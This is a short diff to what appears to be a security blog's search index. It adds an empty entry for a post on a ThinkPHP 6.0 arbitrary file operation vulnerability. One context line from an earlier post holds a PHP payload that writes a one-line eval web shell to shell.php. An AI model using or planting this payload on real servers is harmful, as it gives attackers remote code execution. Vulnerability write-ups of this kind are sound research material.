@@ -1550,4 +1550,9 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 
 ]]></content>
   </entry>
+  <entry>
+    <title>tp6.0任意文件操作漏洞</title>
+    <url>/2023/03/02/tp6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[]]></content>
+  </entry>
 </search>
